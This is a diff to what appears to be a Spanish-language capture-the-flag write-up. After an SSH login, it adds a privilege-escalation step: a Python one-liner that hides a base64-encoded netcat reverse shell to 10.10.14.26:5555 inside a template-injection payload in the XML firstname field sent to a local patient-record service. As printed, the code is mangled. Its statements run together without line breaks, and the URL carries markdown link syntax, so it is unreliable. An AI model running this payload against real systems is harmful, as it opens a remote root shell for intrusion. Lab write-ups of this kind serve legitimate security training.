@@ -55,3 +55,8 @@ Pudiendonos conectar ahora por ssh
 ssh sedric@10.129.3.105  
 ```
 
+Podemos escalar privilegios con
+```py
+python3 -c " import urllib.request, base64 cmd = 'nc 10.10.14.26 5555 -e /bin/bash' b64_cmd = base64.b64encode(cmd.encode()).decode() xml = f'<patient><timestamp>20250101120000</timestamp><sender_app>TEST</sender_app><id>12345</id><firstname>{{import("os").system(import("base64").b64decode("{b64_cmd}").decode())}}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' req = urllib.request.Request('[http://127.0.0.1:54321/addPatient](http://127.0.0.1:54321/addPatient "http://127.0.0.1:54321/addPatient")', data=xml.encode(), headers={'Content-Type': 'application/xml'}) urllib.request.urlopen(req) "
+```
+
